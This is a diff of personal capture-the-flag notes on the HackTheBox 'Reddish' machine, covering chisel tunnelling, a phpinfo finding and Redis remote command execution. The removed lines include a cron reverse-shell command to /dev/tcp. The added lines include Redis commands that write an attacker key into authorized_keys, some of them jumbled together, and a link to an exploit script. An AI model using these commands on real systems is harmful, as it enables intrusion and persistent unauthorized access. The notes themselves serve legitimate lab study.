@@ -14,7 +14,8 @@ Learnt:
 3. cat file transfer
 4. /dev/shm directory
 5. Manual (Heard but not tried till now) Go Programs by using ldflags and upx packing from 10Mb to 3Mb!
-
+6. Power of chisel only.
+7. Excalidraw is time consuming compare to pen and paper but looks good, I guess I'll add a drawing pad to eventually one day shop list 
 
 [Ippsec Reddish Video](https://www.youtube.com/watch?v=Yp4oxoQIBAM)
 
@@ -139,7 +140,7 @@ mount | grep shm # to check flags
 
 ![](reddishwebpage.png)
 
-Ippsec points out a security risk being that if listening on 0.0.0.0 then is directly accessible by anyone.
+Ippsec points out a security risk being that if listening on 0.0.0.0 then is directly accessible by anyone. One thing not pointed out by either Ippsec or 0xDF is that with nikto scan it find a info.php page containing alots of information as it is phpinfo(). Most importantly: `Linux www 4.4.0-130-generic #156-Ubuntu SMP Thu Jun 14 08:53:28 UTC 2018 x86_64`
 
 ```go
 chisel client 10.10.10.10:8000 R:127.0.0.1:8001:172.19.0.3:80
@@ -159,19 +160,33 @@ Ippsec provides justification based on the details in the code that there is dat
 
 
 ![](redisrce.png)
-I am sure I have done this Redis RCE on THM, but I want to read to hammer the RESEARCH button in my brain. Also to count issue in problem solving and desktop space, the beginning on noted diagrams, less ascii art. Introducing [Excalidraw for Obsidian](https://github.com/zsviczian/obsidian-excalidraw-plugin)
+I am sure I have done this Redis RCE on THM, but I want to read to hammer the RESEARCH button in my brain. Also to count issue in problem solving and desktop space, the beginning on noted diagrams, less ascii art. Introducing [Excalidraw for Obsidian](https://github.com/zsviczian/obsidian-excalidraw-plugin). 
 
 
 ![](bamsearchsploit.png)
+Before reading the exploitation of Redis without metasploit. Tunnelling to get to that Redis database is 
 
-Before that seeing one is none and two is one @malwarejake and we are root on the docker:
+![](excellent.png)
+
+[Reading](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html) this database RCE involves write file to the file system by putting out file into Redis server memory and then transfering it.
 ```bash
-echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.109/115 0>&1' > cron && crontab cron"
+$ redis-cli -h 192.168.1.11 flushall
+$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
+# Looks good. How to dump our memory content into the authorized_keys file? 
+# That’skinda trivial.
+$ redis-cli -h 192.168.1.11192.168.1.11:6379> config set dir /Users/antirez/.ssh/OK192.168.1.11:6379> config get dir
+1) "dir"
+2) "/Users/antirez/.ssh"192.168.1.11:6379> config set dbfilename "authorized_keys" 
+OK
+192.168.1.11:6379> save
+OK
 ```
 
+There is also [https://github.com/Ridter/redis-rce/blob/master/redis-rce.py](https://github.com/Ridter/redis-rce/blob/master/redis-rce.py) creates a server to interact with the redis database.  
 
-
-
+https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
+https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
+https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#pivoting
 
 ## PrivEsc
 
